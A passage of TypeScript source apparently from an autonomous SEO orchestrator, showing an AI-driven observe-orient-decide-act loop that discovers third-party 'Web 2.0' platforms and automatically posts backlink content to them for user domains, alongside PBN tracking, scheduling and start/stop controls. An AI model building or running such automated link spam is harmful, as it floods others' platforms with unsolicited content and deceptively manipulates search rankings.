      const { discoverNewPlatforms, autoPostToDiscoveredPlatforms, batchHealthCheck, getPlatformStats } = await import("./platform-discovery-engine");
      
      if (taskType === "platform_discover") {
        // AI discovers new Web 2.0 platforms autonomously
        const niche = targetDomain || "general";
        const discovered = await discoverNewPlatforms(undefined, niche);
        console.log(`[Orchestrator] Platform discovery: ${discovered.newPlatforms} new platforms found`);
        return { action: taskType, status: "completed", newPlatforms: discovered.newPlatforms };
      }
      
      if (taskType === "platform_auto_post" && targetDomain) {
        // Auto-post content with backlinks to discovered platforms
        const session = await autoPostToDiscoveredPlatforms(
          {
            targetUrl: `https://${targetDomain}`,
            targetDomain,
            keyword: targetDomain.replace(/\.(com|org|net|io)$/i, ""),
            niche: "general",
            anchorText: targetDomain,
          },
          20, // maxPlatforms
          40, // minDA
        );
        console.log(`[Orchestrator] Platform auto-post: ${session.successCount}/${session.totalPlatforms} successful for ${targetDomain}`);
        return { action: taskType, status: "completed", total: session.totalPlatforms, success: session.successCount };
      }
      
      if (taskType === "platform_health_check") {
        // Check which platforms are still alive
        const healthResults = await batchHealthCheck();
        console.log(`[Orchestrator] Platform health check: ${healthResults.alive}/${healthResults.total} alive`);
        return { action: taskType, status: "completed", ...healthResults };
      }
      
      if (taskType === "platform_daily_cycle") {
        // Full daily cycle: discover → health check → auto-post for all SEO projects
        console.log(`[Orchestrator] Starting platform daily cycle...`);
        
        // 1. Discover new platforms
        const discovered = await discoverNewPlatforms(undefined, "seo backlinks");
        console.log(`[Orchestrator] Daily discovery: ${discovered.newPlatforms} new platforms`);
        
        // 2. Health check existing platforms
        const health = await batchHealthCheck();
        console.log(`[Orchestrator] Daily health: ${health.alive}/${health.total} alive`);
        
        // 3. Auto-post for all active SEO projects
        const { getUserSeoProjects } = await import("./db");
        const projects = await getUserSeoProjects();
        let totalPosts = 0;
        let totalSuccess = 0;
        
        for (const project of projects.slice(0, 5)) { // Max 5 projects per cycle
          if (!project.domain) continue;
          try {
            const targetKeywordsArr = Array.isArray(project.targetKeywords) ? project.targetKeywords as string[] : [];
            const session = await autoPostToDiscoveredPlatforms(
              {
                targetUrl: `https://${project.domain}`,
                targetDomain: project.domain,
                keyword: targetKeywordsArr[0] || project.domain.replace(/\.(com|org|net|io)$/i, ""),
                niche: project.niche || "general",
                anchorText: project.domain,
              },
              10, // maxPlatforms
              50, // minDA
            );
            totalPosts += session.totalPlatforms;
            totalSuccess += session.successCount;
          } catch (e: any) {
            console.error(`[Orchestrator] Platform post error for ${project.domain}:`, e?.message);
          }
        }
        
        const stats = getPlatformStats();
        console.log(`[Orchestrator] Daily cycle complete: ${totalSuccess}/${totalPosts} posts, ${stats.total} platforms`);
        return { 
          action: taskType, status: "completed",
          discovered: discovered.newPlatforms,
          healthAlive: health.alive,
          totalPosts,
          totalSuccess,
          totalPlatforms: stats.total,
        };
      }
      
      return { action: taskType, status: "dispatched" };
    }

    // ─── Maintenance ───
    if (taskType === "maintenance_health_check") {
      return { action: "health_check_completed", status: "ok" };
    }
    if (taskType === "maintenance_cleanup") {
      return { action: "cleanup_completed", status: "ok" };
    }

    // ─── Reports ───
    if (taskType.startsWith("report_")) {
      return { action: "report_generated", status: "dispatched" };
    }

    return { action: "unknown_task_type", taskType, status: "skipped" };
  } catch (err: any) {
    console.error(`[Orchestrator] executeTask error for ${taskType}:`, err?.message);
    throw err;
  }
}

// ═══════════════════════════════════════════════
//  MAIN OODA CYCLE
// ═══════════════════════════════════════════════

export async function runOodaCycle(): Promise<{
  cycle: number;
  worldState: WorldState;
  analysis: string;
  decisions: OrchestratorDecision[];
  tasksCreated: number;
}> {
  if (isRunningCycle) {
    console.log("[Orchestrator] Cycle already running, skipping");
    return { cycle: 0, worldState: {} as WorldState, analysis: "Skipped — cycle in progress", decisions: [], tasksCreated: 0 };
  }

  isRunningCycle = true;
  const cycleStart = Date.now();

  try {
    const state = await getOrCreateOrchestratorState();
    const cycle = state.currentCycle + 1;

    console.log(`[Orchestrator] ═══ OODA Cycle #${cycle} START ═══`);
    emitCycleStart(cycle);

    // Phase 1: OBSERVE
    console.log("[Orchestrator] Phase 1: OBSERVE — Collecting world state...");
    emitCyclePhase(cycle, "observe", { message: "Collecting world state from all subsystems..." });
    const worldState = await observe();
    await logDecision(cycle, "observe", "global", "World state collected", 
      `Collected state from all subsystems`, 100, null, { summary: `SEO:${worldState.seo.activeProjects} PBN:${worldState.pbn.activeSites} Rank:${worldState.rank.totalTracked}` }, 0, "low");

    // Phase 2: ORIENT
    console.log("[Orchestrator] Phase 2: ORIENT — AI analyzing situation...");
    emitCyclePhase(cycle, "orient", { message: "AI analyzing situation and priorities..." });
    const analysis = await orient(worldState, state);
    await logDecision(cycle, "orient", "global", "Strategic analysis complete",
      analysis, 90, worldState, null, 0, "medium");

    // Phase 3: DECIDE
    console.log("[Orchestrator] Phase 3: DECIDE — AI making decisions...");
    emitCyclePhase(cycle, "decide", { message: "AI making strategic decisions..." });
    const decisions = await decide(worldState, analysis, state);
    console.log(`[Orchestrator] AI made ${decisions.length} decisions`);
    decisions.forEach(d => emitDecisionMade({ subsystem: d.subsystem, action: d.action, priority: d.priority, confidence: d.confidence, reasoning: d.reasoning }));

    // Phase 4: ACT
    console.log("[Orchestrator] Phase 4: ACT — Creating tasks...");
    emitCyclePhase(cycle, "act", { message: "Creating and dispatching tasks..." });
    const tasksCreated = await act(decisions, cycle);
    console.log(`[Orchestrator] Created ${tasksCreated} tasks`);

    // Process task queue
    console.log("[Orchestrator] Processing task queue...");
    await processTaskQueue(state.maxConcurrentTasks);

    // Update orchestrator state
    const nextCycleAt = new Date(Date.now() + state.cycleIntervalMinutes * 60 * 1000);
    await updateOrchestratorState({
      currentCycle: cycle,
      totalCycles: state.totalCycles + 1,
      lastCycleAt: new Date(),
      nextCycleAt,
      todayActions: state.todayActions + tasksCreated,
      totalDecisions: state.totalDecisions + decisions.length,
      totalTasksCompleted: state.totalTasksCompleted + tasksCreated,
      aiWorldState: worldState,
      aiPriorities: decisions.map(d => ({ subsystem: d.subsystem, action: d.action, priority: d.priority })),
    });

    const duration = ((Date.now() - cycleStart) / 1000).toFixed(1);
    console.log(`[Orchestrator] ═══ OODA Cycle #${cycle} COMPLETE (${duration}s) — ${tasksCreated} tasks created ═══`);
    emitCycleComplete(cycle, { duration: parseFloat(duration), tasksCreated, decisionsCount: decisions.length });
    emitMetricsUpdate({ cycle, tasksCreated, decisions: decisions.length, duration: parseFloat(duration) });

    // Send Telegram notification for significant cycles
    if (tasksCreated > 0) {
      try {
        await sendTelegramNotification({
          type: "info",
          targetUrl: "orchestrator",
          details: `🤖 OODA Cycle #${cycle} complete\n📊 ${decisions.length} decisions, ${tasksCreated} tasks\n⏱ ${duration}s\n\n${decisions.map(d => `• [${d.subsystem}] ${d.action} (${d.confidence}% confidence)`).join("\n")}`,
        });
      } catch {}
    }

    return { cycle, worldState, analysis, decisions, tasksCreated };
  } catch (err) {
    console.error("[Orchestrator] OODA Cycle error:", err);
    await updateOrchestratorState({ status: "error" });
    emitCycleError(0, (err as Error)?.message || String(err));
    emitStateChanged("error", { error: (err as Error)?.message || String(err) });
    throw err;
  } finally {
    isRunningCycle = false;
  }
}

// ═══════════════════════════════════════════════
//  START / STOP / PAUSE
// ═══════════════════════════════════════════════

export async function startOrchestrator() {
  const state = await getOrCreateOrchestratorState();
  
  if (state.status === "running") {
    console.log("[Orchestrator] Already running");
    return;
  }

  await updateOrchestratorState({ status: "running" });
  console.log("[Orchestrator] 🚀 Starting autonomous orchestrator...");
  emitStateChanged("running", { message: "Orchestrator started" });

  // Run first cycle immediately
  try {
    await runOodaCycle();
  } catch (err) {
    console.error("[Orchestrator] First cycle error:", err);
  }

  // Schedule recurring cycles
  const intervalMs = state.cycleIntervalMinutes * 60 * 1000;
  orchestratorInterval = setInterval(async () => {
    const currentState = await getOrCreateOrchestratorState();
    if (currentState.status !== "running") {
      if (orchestratorInterval) clearInterval(orchestratorInterval);
      return;
    }
    
    // Reset daily counter at midnight
    const now = new Date();
    if (now.getHours() === 0 && now.getMinutes() < (currentState.cycleIntervalMinutes || 30)) {
      await updateOrchestratorState({ todayActions: 0 });
    }

    try {
      await runOodaCycle();
    } catch (err) {
      console.error("[Orchestrator] Scheduled cycle error:", err);
    }
  }, intervalMs);

  console.log(`[Orchestrator] Scheduled every ${state.cycleIntervalMinutes} minutes`);
}

export async function stopOrchestrator() {
  if (orchestratorInterval) {
    clearInterval(orchestratorInterval);
    orchestratorInterval = null;
  }
  await updateOrchestratorState({ status: "stopped" });
  console.log("[Orchestrator] ⏹ Stopped");
  emitStateChanged("stopped", { message: "Orchestrator stopped" });
}

export async function pauseOrchestrator() {
  if (orchestratorInterval) {
    clearInterval(orchestratorInterval);
    orchestratorInterval = null;
  }
  await updateOrchestratorState({ status: "paused" });
  console.log("[Orchestrator] ⏸ Paused");
  emitStateChanged("paused", { message: "Orchestrator paused" });
}

export function isOrchestratorRunning(): boolean {
  return orchestratorInterval !== null;
}
